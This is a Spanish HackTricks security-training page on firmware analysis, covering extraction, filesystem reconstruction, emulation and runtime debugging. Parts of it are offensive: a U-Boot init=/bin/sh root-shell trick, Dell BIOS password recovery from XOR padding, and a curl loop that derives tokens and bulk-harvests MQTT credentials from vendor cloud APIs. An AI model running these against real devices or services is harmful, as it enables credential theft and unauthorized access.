# Análisis de firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Introducción**

### Recursos relacionados

Para adquirir firmware desde interfaces de hardware expuestas, consulta [Volcado de firmware asistido por una consola UART](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) y [Volcado de memoria flash SPI](../hardware-hacking/spi.md#dumping-firmware-from-eeproms). Para capturar UART de forma repetible durante el arranque, antes de acceder a la consola, consulta [Adquisición con alimentación controlada por SCPI y osciloscopio](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

El firmware es software esencial que permite que los dispositivos funcionen correctamente, pues gestiona y facilita la comunicación entre los componentes de hardware y el software con el que interactúan los usuarios. Se almacena en memoria permanente, lo que garantiza que el dispositivo pueda acceder a instrucciones vitales desde el momento en que se enciende, y permite iniciar el sistema operativo. Examinar y, potencialmente, modificar el firmware es un paso fundamental para identificar vulnerabilidades de seguridad.<sup>[[2]](#references)[[3]](#references)</sup>

## **Recopilación de información**

La **recopilación de información** es un paso inicial fundamental para comprender la composición de un dispositivo y las tecnologías que utiliza. Este proceso implica recopilar datos sobre:

- La arquitectura de la CPU y el sistema operativo que ejecuta
- Los detalles del bootloader
- La disposición del hardware y las hojas de datos
- Las métricas del código base y la ubicación del código fuente
- Las bibliotecas externas y los tipos de licencia
- El historial de actualizaciones y las certificaciones reglamentarias
- Los diagramas de arquitectura y flujo
- Las evaluaciones de seguridad y las vulnerabilidades identificadas

Para ello, las herramientas de **inteligencia de fuentes abiertas (OSINT)** son muy valiosas, al igual que el análisis de cualquier componente de software de código abierto disponible mediante procesos de revisión manuales y automatizados. Herramientas como [Coverity Scan](https://scan.coverity.com) y [Semmle’s LGTM](https://lgtm.com/#explore) ofrecen análisis estático gratuito que puede aprovecharse para detectar posibles problemas.

## **Adquisición del firmware**

El firmware se puede obtener de distintas maneras, cada una con su propio nivel de complejidad:

- Directamente desde la fuente (desarrolladores, fabricantes)
- Compilándolo a partir de las instrucciones proporcionadas
- Descargándolo desde sitios oficiales de soporte
- Usando consultas **Google dork** para encontrar archivos de firmware alojados
- Accediendo directamente al **almacenamiento en la nube** con herramientas como [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Interceptando **actualizaciones** mediante técnicas man-in-the-middle
- Extrayéndolo del dispositivo mediante conexiones como **UART**, **JTAG** o **PICit**
- Capturando solicitudes de actualización en las comunicaciones del dispositivo
- Identificando y utilizando **endpoints de actualización codificados**
- Volcándolo desde el bootloader o la red
- Retirando y leyendo el chip de almacenamiento, como último recurso, con las herramientas de hardware adecuadas

### Registros solo por UART: forzar un shell root mediante el entorno de U-Boot en la memoria flash

Si se ignora UART RX (solo hay registros), aun así puedes forzar un shell de init **editando sin conexión el blob del entorno de U-Boot**:<sup>[[6]](#references)</sup>

1. Vuelca la memoria flash SPI con una pinza SOIC-8 y un programador (3,3 V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Localiza la partición env de U-Boot, edita `bootargs` para incluir `init=/bin/sh` y **vuelve a calcular el CRC32 del env de U-Boot** para el blob.
3. Vuelve a flashear solo la partición env y reinicia; debería aparecer un shell en UART.

Esto es útil en dispositivos integrados cuyo shell del bootloader está deshabilitado, pero cuya partición env se puede escribir mediante acceso externo a la flash.

## Análisis del firmware

Ahora que **tienes el firmware**, necesitas extraer información sobre él para saber cómo tratarlo. Estas son algunas herramientas que puedes usar:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Si no encuentras mucho con esas herramientas, comprueba la **entropía** de la imagen con `binwalk -E <bin>`; si es baja, probablemente no esté cifrada. Si es alta, probablemente esté cifrada (o comprimida de alguna manera).

Además, puedes usar estas herramientas para extraer **archivos integrados en el firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

O [**binvis.io**](https://binvis.io/#/) ([código](https://code.google.com/archive/p/binvis/)) para inspeccionar el archivo.

### Análisis diferencial de flash y almacenes de secretos XOR recuperables

Cuando un ajuste del firmware no tiene un formato de almacenamiento documentado, primero toma varias lecturas coincidentes de la flash, cambia **exactamente** un ajuste, vuelve a volcar el chip completo y compara los offsets. Repetir el experimento con valores controlados permite distinguir el ajuste de los contadores y los metadatos de escritura; los cambios en nuevos offsets en lugar de sobrescribir los datos indican un almacén de solo anexado o estructurado como un registro. Conserva las entradas eliminadas o marcadas como eliminadas, ya que sus bytes de carga útil podrían seguir siendo recuperables.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

After locating the region, extrae los módulos del firmware con herramientas como `binwalk` y analiza mediante ingeniería inversa el writer/validator en Ghidra. Confirma en el código los límites de los campos, el padding, la indexación de claves y la derivación de claves, en lugar de inferir el esquema únicamente a partir de patrones de ciphertext.<sup>[[12]](#references)</sup>

#### Recover keys from encrypted zero padding

Como se describe en [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), el plaintext conocido revela bytes del keystream en los mismos offsets. Un campo de tamaño fijo queda especialmente expuesto cuando su padding de ceros abarca todos los índices de una clave XOR repetitiva: el padding cifrado revela directamente esos bytes de la clave, porque `0x00 XOR key_byte = key_byte`. Si quedan cubiertos todos los índices de la clave, reconstruye la clave a partir del final del ciphertext y descifra los bytes con datos.<sup>[[12]](#references)</sup>

El formato vulnerable de contraseña BIOS DVAR de Dell es un ejemplo concreto: el byte `0` de un campo de 32 bytes está en plaintext, mientras que los bytes `1..31` usan una clave repetitiva de 20 bytes.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Para una longitud de contraseña `L`, las posiciones `L..31` estaban en cero antes de XOR. Cuando `L <= 12`, esas posiciones cubren todos los índices de la clave, por lo que se recuperan la clave completa y la contraseña sin brute force:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Recuperar claves de registros históricos

No analices cada registro de forma independiente. La clave DVAR se deriva aproximadamente como `modified_md5(device_seed || variable_GUID || password[0])`: la semilla del dispositivo y el GUID son fijos, y la única entrada que depende de la contraseña es el primer byte en claro. Esto da como máximo 256 claves por dispositivo y hace que los registros que comienzan con el mismo byte compartan una clave. Agrupa los registros activos y eliminados por ese byte; un registro histórico corto puede hacer leak de la clave completa mediante el padding y permitir decrypt un registro actual más largo cuyo propio padding sea insuficiente. Por lo tanto, la rotación de contraseñas puede aumentar la exposición cuando el ciphertext antiguo se marca como eliminado en lugar de borrarse.<sup>[[12]](#references)</sup>

La herramienta [`dellpwn`](https://github.com/R3n5k1/dellpwn) localiza DVAR, valida registros candidatos, recupera contraseñas y puede mostrar los bytes sin procesar almacenados y de la clave. Compílala desde un checkout y analiza una imagen flash verificada de la siguiente manera:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Para parsers personalizados, descarta los falsos positivos comprobando la estructura de los registros, las restricciones de caracteres imprimibles, el relleno con ceros, la entropía de la clave y la coherencia cuando la clave vuelve al inicio. Si los dumps repetidos muestran pocos cambios de bits por escritura, enumera las máscaras observadas y ordena las correcciones según estas restricciones, pero indica los caracteres ambiguos en lugar de presentar una salida heurística como una recuperación exacta.<sup>[[12]](#references)</sup>

Los verificadores de contraseñas deberían almacenar un hash unidireccional con salt e iteraciones, en lugar de texto cifrado reversible, y los almacenes estructurados en registro deberían eliminar de forma segura el material secreto reemplazado.<sup>[[12]](#references)</sup>

### Obtener el sistema de archivos

Con las herramientas comentadas anteriormente, como `binwalk -ev <bin>`, deberías haber podido **extraer el sistema de archivos**.\
Binwalk suele extraerlo en una **carpeta cuyo nombre corresponde al tipo de sistema de archivos**, que suele ser uno de los siguientes: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Extracción manual del sistema de archivos

A veces, binwalk **no tendrá el byte mágico del sistema de archivos entre sus firmas**. En estos casos, usa binwalk para **encontrar el offset del sistema de archivos y hacer carving del sistema de archivos comprimido** a partir del binario, y **extraerlo manualmente** según su tipo siguiendo los pasos que se indican a continuación.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Ejecuta el siguiente **comando dd** para realizar el carving del sistema de archivos Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternativamente, también se podría ejecutar el siguiente comando.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Para squashfs (usado en el ejemplo anterior)

`$ unsquashfs dir.squashfs`

Después, los archivos estarán en el directorio "`squashfs-root`".

- Archivos de archivo CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Para sistemas de archivos jffs2

`$ jefferson rootfsfile.jffs2`

- Para sistemas de archivos ubifs con memoria flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Reconstrucción de sistemas de archivos raíz embebidos divididos

Si un volcado sin procesar de eMMC/SSD contiene una cabecera de sistema de archivos válida, pero los desplazamientos de sus metadatos exceden el tamaño nominal de la partición, no lo clasifiques inmediatamente como corrupto. El código de arranque embebido puede ensamblar el dispositivo raíz real a partir de varios rangos físicos mediante Device Mapper, por lo que extraer una partición GPT solo produce el primer segmento.<sup>[[9]](#references)</sup>

#### Evaluación inicial de la imagen completa del medio

Primero, verifica que la adquisición haya finalizado, que el tamaño sea estable y que ningún proceso de escritura siga usando la imagen. Si el nombre del archivo codifica una dirección inicial/final, compara ese rango con la cantidad real de bytes. Recupera la GPT en modo de solo lectura y adjunta únicamente el rango necesario; **no** ejecutes `vgchange -ay` en una máquina de trabajo contra un volumen físico no confiable, ya que pueden producirse colisiones entre grupos de volúmenes y escrituras involuntarias.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Prefiere una VM desechable cuando la lógica original de init o una pila LVM deban ver la imagen completa. Los registros históricos de arranque de una partición de arranque estándar son especialmente útiles: es posible que el bootloader haya registrado los offsets de los contenedores propietarios, las longitudes de los componentes, la selección de slot, las reglas de alineación y la verificación de firmas. Usa esos valores para extraer una línea de comandos, un kernel y un initramfs incrustados; luego valida cada salida por separado con `file`, los bytes mágicos y `binwalk`. Leer hasta el final del contenedor puede añadir accidentalmente un initrd, un objeto ACPI o una firma al kernel.<sup>[[9]](#references)</sup>

#### Recuperar el mapa de bloques durante el arranque

Extrae el initramfs del kernel y analiza su `/init` y las bibliotecas de almacenamiento. En [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/), sigue las referencias de cadenas de `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` y las rutas de partición; luego rastrea el código que selecciona el slot A/B activo y construye la tabla. Como puntos de partida útiles en radare2, usa `r2 -A init`, `afl`, `pdf @ main` y `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

El target lineal asigna rangos consecutivos de un dispositivo virtual a rangos de uno o más dispositivos de respaldo. Una tabla recuperada de dos segmentos suele tener este formato (todas las posiciones y longitudes están expresadas en sectores de 512 bytes):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Reproduce exactamente la aritmética del código máquina, incluidos el ancho de los enteros, los desplazamientos y las conversiones de unidades. Por ejemplo, la siguiente expresión redondea hacia abajo un tamaño en bytes al límite de 4 KiB y solo entonces lo convierte a sectores de 512 bytes; reemplazarla por `p4_bytes // 512` desplaza la cola seleccionada en `p4_bytes % 4096` cuando la partición no está alineada a una página.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Reconstruye una imagen plana de análisis copiando los rangos en el orden de la tabla y usando bloques acotados, en lugar de cargar el volcado completo del medio en memoria. Esto también evita crear dispositivos mapper en el host. Mantén los desplazamientos derivados de GPT, los recuentos de sectores invertidos y la longitud resultante de la salida como aserciones independientes.<sup>[[9]](#references)</sup>

#### Distinguir la corrupción de un error constante de reconstrucción

Para SquashFS, comprueba el magic `hsqs` y decodifica el campo little-endian de 64 bits `bytes_used` en el desplazamiento 40 del superblock antes de ejecutar `unsquashfs`. Si la extracción falla en varias estructuras no relacionadas, busca en una ventana amplia alrededor de las posiciones esperadas y exige candidatos estructurales sólidos: un bloque de metadata que se pueda descomprimir, varias entradas de directorio consecutivas válidas, campos de inode plausibles, un inode raíz coherente con el recuento de inodes o una estructura válida de metadata de integridad. Una sola coincidencia de magic no es suficiente.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Cuando el mismo delta firmado hace válidas estructuras independientes —por ejemplo, los metadatos del directorio y un registro de verity—, la causa probable es un error sistemático en el inicio del segmento, no bytes faltantes. Vuelve a la aritmética invertida y busca restos descartados, problemas de signo, desbordamientos o redondeos de sectores/páginas antes de intentar recuperar archivos huérfanos o modificar los metadatos del sistema de archivos.<sup>[[9]](#references)</sup>

Por último, mantén separados los límites de protección: los volúmenes LUKS sellados al TPM protegen la confidencialidad de los datos, mientras que un mapeo dm-verity firmado protege la integridad del sistema de archivos raíz. Un TPM de software no recupera una clave sellada al TPM físico original, y arrancar un SquashFS modificado mediante un init solo para investigación que omite la verificación de verity no falsifica su firma ni rompe dm-verity.<sup>[[9]](#references)</sup>

## Analizando Firmware

Una vez obtenido el firmware, es esencial analizarlo en detalle para comprender su estructura y sus posibles vulnerabilidades. Este proceso implica utilizar diversas herramientas para analizar y extraer datos valiosos de la imagen del firmware.

### Herramientas para el análisis inicial

Se proporciona un conjunto de comandos para la inspección inicial del archivo binario (denominado `<bin>`). Estos comandos ayudan a identificar tipos de archivo, extraer cadenas, analizar datos binarios y comprender los detalles de las particiones y los sistemas de archivos:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Para evaluar el estado de cifrado de la imagen, se comprueba la **entropía** con `binwalk -E <bin>`. Una entropía baja sugiere que no hay cifrado, mientras que una entropía alta indica que podría haber cifrado o compresión.

Para extraer **archivos incrustados**, se recomiendan herramientas y recursos como la documentación de **file-data-carving-recovery-tools** y **binvis.io** para inspeccionar archivos.

### Extracción del sistema de archivos

Con `binwalk -ev <bin>`, normalmente se puede extraer el sistema de archivos, a menudo en un directorio cuyo nombre corresponde al tipo de sistema de archivos (p. ej., squashfs, ubifs). Sin embargo, cuando **binwalk** no reconoce el tipo de sistema de archivos porque faltan los magic bytes, es necesario extraerlo manualmente. Para ello, se usa `binwalk` para localizar el offset del sistema de archivos y, a continuación, el comando `dd` para extraerlo:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Después, según el tipo de sistema de archivos (p. ej., squashfs, cpio, jffs2, ubifs), se usan distintos comandos para extraer manualmente su contenido.

### Análisis del sistema de archivos

Una vez extraído el sistema de archivos, comienza la búsqueda de fallos de seguridad. Se presta atención a los daemons de red inseguros, las credenciales codificadas en el código, los endpoints de API, las funciones del servidor de actualizaciones, el código sin compilar, los scripts de inicio y los binarios compilados para su análisis offline.

Entre las **ubicaciones clave** y los **elementos** que se deben inspeccionar se incluyen:

- **etc/shadow** y **etc/passwd** para encontrar credenciales de usuario
- Certificados y claves SSL en **etc/ssl**
- Archivos de configuración y scripts que podrían contener vulnerabilidades
- Binarios integrados para analizarlos más a fondo
- Servidores web y binarios comunes de dispositivos IoT

Varias herramientas ayudan a descubrir información confidencial y vulnerabilidades en el sistema de archivos:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) y [**Firmwalker**](https://github.com/craigz28/firmwalker) para buscar información confidencial
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) para realizar un análisis exhaustivo del firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) y [**EMBA**](https://github.com/e-m-b-a/emba) para el análisis estático y dinámico

### Comprobaciones de seguridad en binarios compilados

Tanto el código fuente como los binarios compilados encontrados en el sistema de archivos deben examinarse en busca de vulnerabilidades. Herramientas como **checksec.sh** para binarios Unix y **PESecurity** para binarios Windows ayudan a identificar binarios sin protección que podrían ser explotados.

## Obtención de credenciales de configuración cloud y MQTT mediante tokens de URL derivados

Muchos hubs IoT obtienen su configuración específica para cada dispositivo desde un endpoint cloud con un formato similar a este:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Durante el análisis del firmware, es posible que descubras que `<token>` se deriva localmente del ID del dispositivo mediante un secreto codificado en el código, por ejemplo:

- token = MD5( deviceId || STATIC_KEY ) y se representa como hexadecimal en mayúsculas

Este diseño permite que cualquiera que conozca un deviceId y el STATIC_KEY reconstruya la URL y obtenga la configuración cloud, que a menudo revela credenciales MQTT en texto plano y prefijos de topics.

Flujo de trabajo práctico:

1) Extraer el deviceId de los registros de arranque UART

- Conecta un adaptador UART de 3.3 V (TX/RX/GND) y captura los registros:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Busca líneas que impriman el patrón de URL de configuración de cloud y la dirección del broker, por ejemplo:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Recuperar STATIC_KEY y el algoritmo del token del firmware

- Carga los binarios en Ghidra/radare2 y busca la ruta de configuración ("/pf/") o el uso de MD5.
- Confirma el algoritmo (p. ej., MD5(deviceId||STATIC_KEY)).
- Deriva el token en Bash y convierte el hash a mayúsculas:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Recopilar la configuración de cloud y las credenciales de MQTT

- Compón la URL y descarga el JSON con curl; analízalo con jq para extraer los secretos:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Abusa de MQTT en texto plano y de ACL débiles para topics (si existen)

- Usa las credenciales recuperadas para suscribirte a topics de mantenimiento y buscar eventos sensibles:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Enumerar IDs de dispositivos predecibles (a escala, con autorización)

- Muchos ecosistemas incorporan bytes de OUI del proveedor/fabricante, producto y tipo, seguidos de un sufijo secuencial.
- Puedes iterar sobre IDs candidatos, derivar tokens y obtener configuraciones programáticamente:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notas
- Obtén siempre autorización explícita antes de intentar realizar enumeraciones masivas.
- Siempre que sea posible, prefiere la emulación o el análisis estático para recuperar secretos sin modificar el hardware objetivo.

El proceso de emular firmware permite realizar **análisis dinámico** del funcionamiento de un dispositivo o de un programa individual. Este enfoque puede presentar dificultades debido a dependencias de hardware o arquitectura, pero transferir el sistema de archivos raíz o binarios específicos a un dispositivo con la misma arquitectura y el mismo endianness, como una Raspberry Pi, o a una máquina virtual preconfigurada, puede facilitar pruebas adicionales.

### Emulación de binarios individuales

Para examinar programas individuales, es crucial identificar el endianness y la arquitectura de CPU del programa.

#### Ejemplo con arquitectura MIPS

Para emular un binario con arquitectura MIPS, se puede usar el comando:

```bash
file ./squashfs-root/bin/busybox
```

Y para instalar las herramientas de emulación necesarias:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Para MIPS (big-endian), se usa `qemu-mips`, y para los binarios little-endian, se elegiría `qemu-mipsel`.

#### Emulación de la arquitectura ARM

Para los binarios ARM, el proceso es similar: se utiliza el emulador `qemu-arm`.

### Emulación de sistema completo

Herramientas como [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) y otras facilitan la emulación completa del firmware, automatizan el proceso y ayudan en el análisis dinámico.

### Reconstrucción de sistemas de archivos root divididos y verificados para la emulación

Si se puede leer un superblock de SquashFS, pero los offsets de inode, directorio o tabla de fragmentos son imposibles, no parchees `unsquashfs` de inmediato. Haz ingeniería inversa del binario de arranque inicial y reproduce el grafo de dispositivos de bloques que crea: los sistemas integrados pueden exponer una partición root nominal, pero construir el sistema de archivos real con un mapeo `dm-linear` que añade sectores tomados de otra partición. Las comprobaciones que solo validan el superblock pueden tener éxito aunque todos los bloques de metadatos posteriores estén desplazados.<sup>[[11]](#references)</sup>

Preserva exactamente la aritmética del firmware. En particular, identifica si las longitudes están expresadas en bytes, sectores de 512 bytes o páginas de 4 KiB; reproduce los desplazamientos de bits y el truncamiento en su orden original; y ten en cuenta las regiones finales dependientes del banco en diseños A/B. Por ejemplo, `(partition_bytes >> 12) << 3` primero trunca al límite de 4 KiB y solo después expresa el resultado en sectores de 512 bytes; sustituirlo por `partition_bytes // 512` puede desplazar unos cuantos kilobytes la extensión añadida y corromper todas las tablas posteriores de SquashFS.<sup>[[11]](#references)</sup>

Un flujo de validación útil es:<sup>[[11]](#references)</sup>

1. Recupera del binario de verifier/init el dispositivo de origen, el sector inicial y la longitud de cada segmento `dm-linear`.
2. Concatena o mapea las extensiones sin alterar la semántica de alineación.
3. Si la extracción sigue fallando, busca solo en una ventana pequeña alrededor del límite previsto y exige varias estructuras de metadatos válidas consecutivas, en lugar de aceptar únicamente un superblock plausible.
4. Ejecuta `unsquashfs` sin modificar sobre la imagen reconstruida; recorrer correctamente todos los directorios y fragmentos es una evidencia más sólida que `unsquashfs -stat`.

#### Reemplazo de dm-verity controlado por el analista

Cuando el analista controla el kernel de QEMU, el initramfs y los discos virtuales, se puede arrancar un root modificado reemplazando el PID 1 de verificación del proveedor por un init pequeño enlazado estáticamente. Esto es una **sustitución de la cadena de arranque en un laboratorio**, no una ruptura de dm-verity, de su firma RSA, de Secure Boot ni de una clave sellada por TPM.<sup>[[11]](#references)</sup>

El init de reemplazo debería reproducir las partes operativas de la ruta de arranque original: montar `devtmpfs`, llamar a `setsid()`, conectar `/dev/console` a los descriptores de archivo 0–2, montar `/proc` y `/sys`, esperar al dispositivo de bloques proporcionado, montar en modo de solo lectura el root editado, desmontar los seud sistemas de archivos del root antiguo, mover el nuevo montaje a `/`, ejecutar `chroot` y ejecutar con `execve()` el `/sbin/init` original del firmware. Desmontar `/dev`, `/proc` y `/sys` **antes** de `MS_MOVE` evita desmontar accidentalmente puntos de montaje que pertenecen al root nuevo.<sup>[[11]](#references)</sup>

Mantén el estado mutable del dispositivo separado del root inmutable modificado. Una capa superpuesta qcow2 puede preservar el estado LVM del disco original mientras un segundo disco virtio de solo lectura proporciona el SquashFS editado:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Depuración del estado de la imagen sin conexión

Inspecciona el estado persistente desde fuera del sistema invitado cuando los arranques lentos, los scripts de inicio destructivos o los registros de consola poco fiables oculten el fallo. Nunca conectes un overlay que esté usando una VM en ejecución; exponlo con `qemu-nbd`, limita la detección de LVM a la partición NBD prevista y desactiva el grupo de volúmenes antes de desconectarlo.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Para aislar fallos de forma reproducible, escribe archivos marcadores con marca de tiempo en un volumen de escritura estable y verifícalos sin conexión; `/dev/kmsg`, las FIFO y las consolas transitorias pueden producir falsos negativos por limitación de frecuencia o por la terminación prematura del proceso. Compara también las interfaces exactas entre capas antes de cambiar código no relacionado: `uname -r` frente a `/lib/modules/`, las características de ext4 en disco frente a la configuración del kernel, y la generación de `libGL` de Mesa frente al ABI del controlador DRI y los nombres de controladores derivados de PCI. Un componente puede existir e incluso cargarse correctamente mediante `dlopen()` y, aun así, ser inutilizable porque el consumidor espera un ABI diferente.<sup>[[11]](#references)</sup>

## Análisis dinámico en la práctica

En esta etapa, se utiliza un entorno de dispositivo real o emulado para el análisis. Es esencial mantener el acceso al shell del sistema operativo y al sistema de archivos. Es posible que la emulación no reproduzca perfectamente las interacciones con el hardware, lo que puede requerir reiniciarla ocasionalmente. El análisis debe volver a examinar el sistema de archivos, explotar las páginas web y los servicios de red expuestos, y explorar las vulnerabilidades del bootloader. Las pruebas de integridad del firmware son fundamentales para identificar posibles vulnerabilidades de backdoor.

## Técnicas de análisis en tiempo de ejecución

El análisis en tiempo de ejecución consiste en interactuar con un proceso o binario en su entorno operativo, usando herramientas como gdb-multiarch, Frida y Ghidra para establecer puntos de interrupción e identificar vulnerabilidades mediante fuzzing y otras técnicas.

Para objetivos embebidos sin un depurador completo, **copia un `gdbserver` enlazado estáticamente** al dispositivo y conéctate de forma remota:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Asignación de mensajes Zigbee / coprocesador de radio

En los hubs IoT, la pila de RF suele estar dividida entre un **MCU de radio** y un proceso de espacio de usuario de Linux. Un flujo de trabajo útil consiste en mapear la ruta:<sup>[[8]](#references)</sup>

1. **Trama RF** transmitida por el aire
2. **Parser del controlador** en el MCU de radio
3. **Protocolo de texto o TLV por serie/UART** reenviado a Linux (por ejemplo, `/dev/tty*`)
4. **Despachador de la aplicación** en el daemon principal
5. **Manejador específico del protocolo / máquina de estados**

Esta arquitectura crea dos objetivos de ingeniería inversa en lugar de uno. Si el controlador convierte tramas de radio binarias en un protocolo textual como `Group,Command,arg1,arg2,...`, identifica:

- Los **grupos de mensajes** y las tablas de despacho
- Qué mensajes pueden proceder de la **red** y cuáles del propio controlador
- Los **campos discriminadores específicos del fabricante** exactos (por ejemplo, Zigbee `manufacturer_code` y `cluster_command` personalizados)
- Qué manejadores solo son accesibles durante las fases de **commissioning**, descubrimiento o descarga de firmware/modelo

En el caso de Zigbee, captura el tráfico de emparejamiento y comprueba si el objetivo sigue usando la **Link Key** predeterminada `ZigBeeAlliance09`. De ser así, la interceptación del tráfico de commissioning podría revelar la **Network Key**. Los códigos de instalación de Zigbee 3.0 reducen esta exposición, así que comprueba si el dispositivo probado realmente los exige.

### Manejadores de protocolo específicos del fabricante y accesibilidad condicionada por FSM

